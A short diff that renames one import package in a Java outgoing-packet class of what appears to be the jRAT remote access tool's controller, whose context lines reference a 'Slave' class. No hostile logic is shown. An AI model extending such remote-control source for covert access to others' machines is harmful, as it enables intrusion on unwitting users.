@@ -1,6 +1,6 @@
 package jrat.controller.packets.outgoing;
 
-import io.jrat.common.io.FileIO;
+import jrat.common.io.FileIO;
 import jrat.controller.Slave;
 import java.io.DataOutputStream;
 import java.io.File;
